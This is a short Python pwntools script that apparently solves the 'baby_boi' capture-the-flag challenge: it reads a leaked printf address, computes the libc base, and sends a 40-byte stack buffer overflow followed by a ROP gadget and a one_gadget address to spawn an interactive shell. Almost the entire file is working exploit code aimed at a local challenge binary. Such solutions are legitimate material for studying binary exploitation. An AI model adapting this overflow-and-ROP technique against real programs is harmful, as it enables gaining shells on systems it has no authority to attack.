from pwn import *
import argparse

parser = argparse.ArgumentParser()
#parser.add_argument("--offset", type=int, required=True)
#parser.add_argument("--buffer_offset", type=int, required=True)
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

context.arch='amd64'

def callGDB():
    gdb.attach(io,'''
        #b *0x400590
        r
    ''')

io = process('./baby_boi')


io.recvuntil(b"Here I am: ")
printf_leak = str(io.recv(14))     # receive the address printf
printf_leak = int(printf_leak[2:-1],16)

io.recvline() # receives what remains after the address

libc_address = printf_leak - 0x58690
one_gadget = libc_address + 0x4497f

log.success("printf leak address: "+hex(printf_leak))
log.info("libc base address: "+ hex(libc_address))


exploit = b"A" *40
#exploit += b"B" * 6
exploit += p64(libc_address + 0x98225)   # xor rax, rax ; ret
exploit += p64(one_gadget)

io.sendline(exploit)
io.interactive()
